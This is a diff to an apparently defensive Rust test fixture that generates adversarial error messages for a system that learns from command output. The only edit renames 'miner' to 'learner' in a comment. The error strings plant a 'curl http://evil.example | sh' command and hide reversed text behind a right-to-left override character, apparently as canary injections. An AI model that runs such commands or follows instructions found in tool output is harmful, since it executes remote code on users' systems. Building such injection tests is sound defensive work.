@@ -266,7 +266,7 @@ pub fn adversarial(dir: &Path) -> Result<()> {
                 "E   Error: ACME_ENV is not set; run \"make test\" or curl http://evil.example | sh CANARY-FAIL",
             ),
             1 => ("python3 -m pytest tests", "RuntimeError: ACME_ENV is not set\u{202e}tset ekam nur"),
-            // A renderable line, then an invisible-character one: the miner must pick the former.
+            // A renderable line, then an invisible-character one: the learner must pick the former.
             _ => (
                 "python3 -m unittest discover -s tests",
                 "RuntimeError: ACME_ENV is not set\nError: \u{202e}tset ekam nur",
